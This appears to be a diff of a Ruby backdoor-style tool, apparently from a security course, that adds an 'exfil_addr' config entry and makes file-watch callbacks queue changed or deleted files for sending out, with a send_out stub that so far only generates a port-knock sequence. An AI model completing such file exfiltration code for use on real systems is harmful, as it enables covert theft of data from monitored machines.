@@ -42,6 +42,7 @@ CONFIG_FILE_DEFAULT << "\# pen_prot = tcp\n"
 CONFIG_FILE_DEFAULT << "\# pen_port = 6886\n"
 CONFIG_FILE_DEFAULT << "\# exfil_prot = tcp\n"
 CONFIG_FILE_DEFAULT << "\# exfil_port = 8668\n"
+CONFIG_FILE_DEFAULT << "\# exfil_addr = 8.8.8.8\n"
 CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
 CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
 CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
@@ -123,21 +124,30 @@ def start_watch(type, name)
   FSSM.monitor('/test', glob) do
     update { |base, relative|
       puts "#{base}/#{relative} has been updated"
-      # send file
+      Thread.new { send_out(:file, "#{base}/#{relative}") }
     }
     delete { |base, relative|
       puts "#{base}/#{relative} has been deleted"
-      # send message
+      Thread.new { send_out(:msg, "#{base}/#{relative}") }
     }
     create { |base, relative|
       puts "#{base}/#{relative} has been created"
-      # send file
+      Thread.new { send_out(:file, "#{base}/#{relative}") }
     }
   end
+  puts "watch on #{name} started"
 end
 
-def send_file(file, destination)
-  
+#2 modes, message, file
+def send_out(mode, data)
+  if mode == :file
+    generate_knock_seq
+  elsif mode == :msg
+    generate_knock_seq
+  else
+    #should probs not get here
+  end
+        
 end
 
 def generate_knock_seq
